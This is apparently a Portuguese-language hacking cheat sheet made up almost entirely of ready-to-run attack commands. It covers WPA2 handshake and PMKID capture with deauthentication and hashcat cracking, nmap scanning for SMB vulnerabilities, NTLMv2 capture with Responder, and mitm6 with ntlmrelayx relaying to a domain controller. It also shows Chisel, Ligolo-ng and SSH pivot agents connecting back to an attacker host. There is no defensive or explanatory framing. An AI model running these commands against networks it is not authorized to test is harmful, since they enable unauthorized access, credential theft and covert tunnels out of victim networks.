## ⚡ Comandos — Cheatsheet Rápido

### 📡 Wi-Fi Hacking — WPA2

```bash
# monitor mode
airmon-ng check kill && airmon-ng start wlan0

# listar redes + capturar handshake
airodump-ng wlan0mon
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon

# forçar reconexão (deauth)
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# converter + crack offline
hcxpcapngtool -o hash.hc22000 captura.cap
hashcat -m 22000 hash.hc22000 rockyou.txt -r best64.rule

# PMKID attack (sem cliente conectado)
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o hash.hc22000 pmkid.pcapng
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```

### 🌐 Reconhecimento de Redes

```bash
# descoberta de hosts
nmap -sn 192.168.1.0/24

# scan completo furtivo
nmap -sS -sV -sC -O -p- --min-rate 3000 target

# SMB vulnerability
nmap --script smb-vuln* -p 445 target

# Responder — captura NTLMv2
responder -I eth0 -dwF
hashcat -m 5600 hashes.txt rockyou.txt

# MITM6 + relay
mitm6 -d empresa.local
ntlmrelayx.py -6 -t ldaps://DC_IP -wh fakewpad --delegate-access
```

### 🔀 Pivoting

```bash
# Chisel — reverse pivot
chisel server -p 8080 --reverse          # attacker
chisel client ATTACKER:8080 R:socks      # pivot

# Ligolo-ng
./proxy -selfcert                                      # attacker
./agent -connect ATTACKER:11601 -ignore-cert           # pivot

# SSH SOCKS5
ssh -D 1080 -N -q user@pivot             # depois: proxychains nmap ...
```
